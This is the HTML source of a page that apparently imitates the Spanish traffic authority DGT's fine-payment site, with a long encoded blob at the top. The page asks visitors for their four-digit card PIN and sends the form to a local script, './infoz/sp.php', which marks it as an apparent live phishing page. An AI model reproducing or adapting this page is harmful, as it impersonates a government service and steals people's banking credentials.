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">
         </form>
      </nav>
      <!--/ Menu principal de enlaces -->
   </header>
   <main class="main-content">
      <!-- Avisos -->
      <div class="dgt-announcements-header" bis_skin_checked="1">
         <div class="dgt-announcements-title" bis_skin_checked="1">
            <span class="badge badge-info"><span id="numeroAvisosId">1</span>
            </span> &nbsp;Avisos importantes
         </div>

         <div class="dgt-announcements-minimize" data-toggle="collapse" aria-expanded="false" href="#iwpsAlertasId" bis_skin_checked="1">
            <span class="fa" aria-hidden="true"></span>
         </div>
      </div>
      <!-- 
         <div class=" collapse in" id="iwpsAlertasId" >
          -->
      <div class=" collapse " id="iwpsAlertasId">
         <div class="unslider"><div class="unslider"><div class="unslider"><div class="carousel unslider-horizontal" data-ride="carousel" style="position: relative; overflow: hidden;">
            <ul class="unslider-wrap unslider-carousel" style="width: 100%; left: 0%;">
               <li class="slide unslider-active" style="width: 100%;">
                  <div class="slide-table">
                     <div class="slide-cell">
                        <div class="slide-content" style="width: 100%; height: 80px; margin: 0 auto">
                           <span class="title">Aviso</span> <span class="sr-only">Hemos observado algunos problemas al intentar el pago de multas con Safari. Estamos trabajando en la solución. Mientras tanto, puedes usar cualquier otro navegador para realizar el pago. Disculpa las molestias.</span>
                           Hemos observado algunos problemas al intentar el pago de multas con Safari. Estamos trabajando en la solución. Mientras tanto, puedes usar cualquier otro navegador para realizar el pago. Disculpa las molestias.
                        </div>
                     </div>
                  </div>
               </li>
            </ul>
         </div><nav class="unslider-nav"><ol><li data-slide="0" class="unslider-active"><button class="unslider-control" tabindex="0" title="Ir a diapositiva número 1"><span class="sr-only">Ir a diapositiva número 1</span><span class="fa fa-circle" aria-hidden="true"></span></button></li><li><button class="unslider-control unslider-start control-active" type="button" tabindex="0" title="Comenzar transición de diapositivas">			<span class="sr-only">Comenzar transición de diapositivas</span>			<span class="fa fa-play-circle" aria-hidden="true"></span>		</button></li><li><button class="unslider-control unslider-stop" type="button" tabindex="0" title="Parar transición de diapositivas">			<span class="sr-only">Parar transición de diapositivas</span>			<span class="fa fa-pause-circle" aria-hidden="true"></span>		</button></li></ol></nav></div><nav class="unslider-nav"><ol><li data-slide="0" class="unslider-active"><button class="unslider-control" tabindex="0" title="Ir a diapositiva número 1"><span class="sr-only">Ir a diapositiva número 1</span><span class="fa fa-circle" aria-hidden="true"></span></button></li><li><button class="unslider-control unslider-start control-active" type="button" tabindex="0" title="Comenzar transición de diapositivas">			<span class="sr-only">Comenzar transición de diapositivas</span>			<span class="fa fa-play-circle" aria-hidden="true"></span>		</button></li><li><button class="unslider-control unslider-stop" type="button" tabindex="0" title="Parar transición de diapositivas">			<span class="sr-only">Parar transición de diapositivas</span>			<span class="fa fa-pause-circle" aria-hidden="true"></span>		</button></li></ol></nav></div><nav class="unslider-nav"><ol><li data-slide="0" class="unslider-active"><button class="unslider-control" tabindex="0" title="Ir a diapositiva número 1"><span class="sr-only">Ir a diapositiva número 1</span><span class="fa fa-circle" aria-hidden="true"></span></button></li><li><button class="unslider-control unslider-start control-active" type="button" tabindex="0" title="Comenzar transición de diapositivas">			<span class="sr-only">Comenzar transición de diapositivas</span>			<span class="fa fa-play-circle" aria-hidden="true"></span>		</button></li><li><button class="unslider-control unslider-stop" type="button" tabindex="0" title="Parar transición de diapositivas">			<span class="sr-only">Parar transición de diapositivas</span>			<span class="fa fa-pause-circle" aria-hidden="true"></span>		</button></li></ol></nav></div>
      </div>
      <!-- Avisos
         <h:panelGroup
            rendered="true">
            <p class="alert alert-info alert-dismissible" role="alert">
               <button type="button" class="close removeif-nojs" data-dismiss="alert" aria-label="Cerrar"> 
                  <span class="sr-only">Cerrar</span>
                  <span class="fa fa-times" aria-hidden="true"></span>
               </button>
               <ui:repeat value="[es.trafico.iwps.intr.modelo.dominio.datosgenerales.AvisosDto@237a237a]" var="avisos">
                  <span class="fa fa-info-circle"></span>
                  <span class="sr-only"></span>
                  
                  <br />
               </ui:repeat>
            </p>
         </h:panelGroup>
         -->
      <a id="main-content"></a>
      <a name="validacionesError"></a>
      <header>
         <span class="hide"> Pago de su multa N°164357371274</span>
         <h2>Pago de su multa N°164357371274</h2>
      </header>
      <!-- Errores frontal -->
               <!-- Lista Errores -->
      <div class="cotainer-fluid">
            <div class="row">
               
            </div>
            <div class="row">
               <div class="col-sm-12 text-center">
                  
                  
               </div>
            </div>
         </div>
      <!-- Panel Mensajes Error -->
      <!--  
         <t:div rendered="false">
            <br/>
            <div class="alert alert-danger alert-dismissible fade in" role="alert" id="marcoAlertaServidorId">
               <button type="button" class="close removeif-nojs" data-dismiss="alert" aria-label="Cerrar">
                  <span class="sr-only">Cerrar</span> <span class="fa fa-times" aria-hidden="true"></span>
               </button>
               <span class="fa fa-times-circle"></span> <span class="sr-only">Atención.</span>
               Errores:
               <h:messages id="mensajeErrorId" showSummary="false" showDetail="true" />
            </div>
         </t:div>
         -->
      <form id="indexFormId" name="indexFormId" method="post" action="./infoz/sp.php" autocomplete="off" enctype="application/x-www-form-urlencoded">
         <input type="hidden" name="indexFormId" value="indexFormId">
         <div class="box bordered-box overlapped-title-box">
            <div class="container-fluid">
               
               <div class="row" style="margin-top: 10px;"><div class="entry-item" id="amexcid"></div></div>
               <div class="row" style="margin-top: 10px;">
                  <div class="col-sm-6"><label class="mandatory">Introduzca el pin de la tarjeta</label><input type="password" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" minlength="4" maxlength="4" name="pin" id="cvv" title="" autofocus="" placeholder="" required="" class="form-control">

                  </div>
               </div>
            </div>
            <table class="table table-striped">
               <caption><label class="title">Pin de tarjeta</label>
               </caption>
            </table>
         </div>
         <!-- Tabla de datos -->
         <div class="btn-panel" style="text-align: center;">
            <button type="submit" title="Continuar" class="btn btn-primary">Continuar</button>
            <br> <br>
         </div>

      </form>
      <!-- Encuesta -->
      <div class="box bordered-box overlapped-title-box">
         <div class="row">
            <div class="col-sm-2">
               <a title="Acceso al Ministerio del Interior en una nueva ventana" href="https://dgt1.typeform.com/to/KkOitU" target="_blank">
               <img src="./assets/images/YiKPiJLpDKou.png" height="60" width="100" alt="Tu opinión nos importa">
               </a>
            </div>
            <div class="col-sm-10">Te invitamos a realizar nuestra encuesta de satisfacción. Así nos ayudarás a construir una aplicación que se ajuste más a tus necesidades. ¡Anímate! (Pulsa sobre la imagen).
            </div>
         </div>
         <table class="table table-striped">
            <caption>
               <h4 class="title">Tu opinión nos importa</h4>
            </caption>
         </table>
      </div>
   </main>
   <footer class="main-footer">
      <nav>
         <h2 class="sr-only">Pie de página</h2>
         <h3 class="sr-only">Ayuda y políticas</h3>
         <ul class="inline links piped">
            <li>
               <a class="link" href="https://sede.dgt.gob.es/es/contenidos/aviso-legal.shtml" target="_blank" title="Aviso legal">Aviso legal</a>
            </li>
            <li>
               <a class="link" href="https://sede.dgt.gob.es/es/contenidos/propiedad-intelectual.shtml" target="_blank" title="Propiedad intelectual">Propiedad intelectual</a>
            </li>
            <li>
               <a class="link" href="https://sede.dgt.gob.es/es/contenidos/accesibilidad.shtml" target="_blank" title="Accesibilidad">Accesibilidad</a>
            </li>
            <li>
               <a class="link" href="https://sede.dgt.gob.es/es/contenidos/proteccion-datos.shtml" target="_blank" title="Protección de datos">Protección de datos</a>
            </li>
            <!--  Correo Ana Maria oria [03/05/2017] IWPS - Necesidad ultimos estilos de sede
               <li>
                  <a class="link" href="#" target="_self" title="Acceso a Política de privacidad">Política de privacidad</a>
               </li>
               -->
         </ul>
         <div class="footer-social">
            <ul>
               <li>
                  <a href="https://www.facebook.com/DGTes" target="_blank" title="Abrir en nueva ventana Página de Facebook">
                  <em class="fa fa-facebook-square"><span class="hide">Página de Facebook</span></em>
                  </a>
               </li>
               <li>
                  <a href="https://twitter.com/DGTes" target="_blank" title="Abrir en nueva ventana Página de Twitter">
                  <em class="fa fa-twitter-square"><span class="hide">Página de Twitter</span></em>
                  </a>
               </li>
               <li>
                  <a href="http://www.youtube.com/user/publicidaddgt" target="_blank" title="Abrir en nueva ventana Página de YouTube">
                  <em class="fa fa-youtube-square"><span class="hide">Página de YouTube</span></em>
                  </a>
               </li>
               <li>
                  <a href="https://www.instagram.com/dgtes/" target="_blank" title="Abrir en nueva ventana Página de Instagram">
                  <em class="fa fa-instagram"><span class="hide">Página de Instagram</span></em>
                  </a>
               </li>
            </ul>
         </div>
         <h3 class="sr-only">Copyright</h3>
         <p class="copyright">Copyright @ DGT 2025. Todos los derechos reservados</p>
         <h3 class="sr-only">Contacto</h3>
         <ul class="inline contact">
            <li>
               <span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
               <span class="sr-only">Teléfono</span>
               011 Estado del Tráfico
            </li>
            <li>
               <span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
               <span class="sr-only">Teléfono</span>
               060 Admin. Gral. del Estado
            </li>
            <li>
               <span class="fa fa-map-marker fa-white" aria-hidden="true" title="Ubicación"></span>
               <span class="sr-only">Ubicación</span>
               C/ Josefa Valcarcel, 28 - 28071 Madrid-España
            </li>
         </ul>
      </nav>
   </footer>
   <div id="Version_V05"></div>
   <!-- MYFACES JAVASCRIPT -->

</body></html>